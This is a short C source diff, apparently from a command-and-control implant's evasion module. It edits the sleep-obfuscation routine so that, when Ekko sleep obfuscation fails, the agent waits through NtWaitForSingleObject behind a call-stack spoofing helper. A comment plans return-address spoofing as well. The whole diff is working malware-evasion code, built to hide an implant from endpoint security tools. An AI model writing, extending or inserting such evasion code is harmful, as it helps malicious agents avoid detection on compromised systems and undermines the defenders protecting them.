@@ -1,4 +1,4 @@
-#include "../../../../headers/agent/evasion/SleepObfu/SleepObfMain.h"
+#include "../../../../headers/agent/evasion/Common.h"
 
 
 UINT GetSleepTime() {
@@ -78,7 +78,9 @@ void PerformSleepObf()
 	if (!EkkoSleepObf(TimeToSleep))
 	{
 		//TODO have return address spoofing implemented here.
-		WaitForSingleObject(NtCurrentProcess(), TimeToSleep);
+		PLARGE_INTEGER MicroSleepTime = (PLARGE_INTEGER)agent->apis->pLocalAlloc(LPTR, sizeof(LARGE_INTEGER));
+		MicroSleepTime->QuadPart = -10000 * TimeToSleep;
+		SpoofStack(agent->apis->pNtWaitForSingleObject, 3, NtCurrentProcess(), FALSE,  MicroSleepTime);
 	}
 
 	return;
